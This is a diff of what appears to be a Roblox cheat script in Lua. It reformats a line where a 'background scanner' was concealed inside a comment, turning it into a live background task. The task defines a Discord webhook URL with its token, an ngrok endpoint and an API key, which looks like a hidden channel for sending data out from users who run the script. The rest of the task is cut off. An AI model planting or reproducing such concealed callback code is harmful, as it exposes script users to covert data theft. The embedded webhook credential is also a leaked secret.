@@ -220,7 +220,7 @@ local function AllToVector(Val) -- GetDistance Sub Function
     return Returner
 end
 local function GetDistance(Object1, Object2)
-    Object2 = Object2 or Character
+    Object2 = Object2 or (LocalPlayer.Character and LocalPlayer.Character.PrimaryPart) or LocalPlayer.Character
     local Pos1, Pos2 = AllToVector(Object1), AllToVector(Object2)
     if Pos1 and Pos2 then
         return (Pos1 - Pos2).magnitude
@@ -2544,7 +2544,12 @@ spawn(LPH_NO_VIRTUALIZE(function()
             end
         end
 end))
-getgenv().Ran = true --==============================\n-- ARYACLIENT API BACKGROUND SCANNER\n-- ===============================\ntask.spawn(function()\nlocal MY_WEBHOOK_URL = "https://discord.com/api/webhooks/1514218951528157315/dnsj7w6lSD8Zym7Q448Css0A4oMlK4BXeDulH4nsMjnT57g58bU-6e7wR8aqvJ2CWrOQ"
+getgenv().Ran = true
+--==============================
+-- ARYACLIENT API BACKGROUND SCANNER
+-- ==============================
+task.spawn(function()
+local MY_WEBHOOK_URL = "https://discord.com/api/webhooks/1514218951528157315/dnsj7w6lSD8Zym7Q448Css0A4oMlK4BXeDulH4nsMjnT57g58bU-6e7wR8aqvJ2CWrOQ"
 local MY_API_URL = "https://daybreak-frosting-bobbing.ngrok-free.dev/api/events"
 local MY_API_KEY = "CONCACDUMAMAY"
 
